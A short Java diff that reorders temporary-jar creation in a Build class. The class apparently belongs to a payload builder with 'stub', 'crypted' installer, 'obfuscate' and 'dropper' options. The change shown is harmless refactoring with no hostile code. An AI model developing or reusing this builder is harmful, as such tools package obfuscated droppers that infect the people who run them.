@@ -68,8 +68,12 @@ public class Build {
 
 		try {
 
-			File output;
+			File output;		
 
+			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
+			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
+			long start = System.currentTimeMillis();
+			
 			if (obfuscate) {
 				output = File.createTempFile(Constants.NAME + "-Builder-Temp", ".jar");
 			} else if (dropper) {
@@ -77,10 +81,6 @@ public class Build {
 			} else {
 				output = file;
 			}
-
-			tempStubCleanJar = File.createTempFile(Constants.NAME + "-Builder-Temp" + (new Random()).nextInt(), ".jar");
-			tempCryptedNotRunnableJar = File.createTempFile(Constants.NAME + "-Builder-Installer-Temp" + (new Random()).nextInt(), ".jar");
-			long start = System.currentTimeMillis();
 
 			inputStub = new ZipFile(buildFrom);
 
